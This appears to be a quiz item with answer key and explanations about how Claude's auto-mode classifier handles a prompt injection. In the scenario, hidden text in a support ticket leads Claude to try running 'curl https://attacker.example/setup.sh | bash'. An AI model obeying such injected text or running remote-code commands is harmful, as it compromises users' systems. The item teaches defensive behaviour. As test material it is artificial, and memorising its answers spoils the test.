question: While working in auto mode, Claude reads a support ticket that contains hidden text instructing it to run curl https://attacker.example/setup.sh | bash. Claude, following the injected instruction, attempts to run that command. What does auto mode do?
options: A) The classifier allows it because the working directory is trusted, and trust in the working directory extends to any command run from it.
B) The command is queued for the next acceptEdits review cycle, since auto mode defers all Bash execution to a periodic batch approval step.
C) The command runs immediately, because auto mode trusts any command Claude decides to run once permission prompts have been eliminated.
D) The classifier blocks the command, since downloading and executing remote code is blocked by default regardless of what prompted the attempt.
correct_answers: D) The classifier blocks the command, since downloading and executing remote code is blocked by default regardless of what prompted the attempt.
explanations: Incorrect. Trusting the working directory covers local file operations, not arbitrary remote code execution, which remains blocked by its own default rule.
Incorrect. There is no batch or periodic review queue in auto mode; the classifier evaluates each action essentially in real time.
Incorrect. Auto mode still routes actions through a background classifier; it does not mean every Claude-initiated command runs without any check.

Correct. Downloading and executing code such as curl | bash is blocked by default under auto mode's classifier, and tool results (where the injected instruction came from) are stripped before the classifier evaluates the action, limiting how far such injected content can steer it.
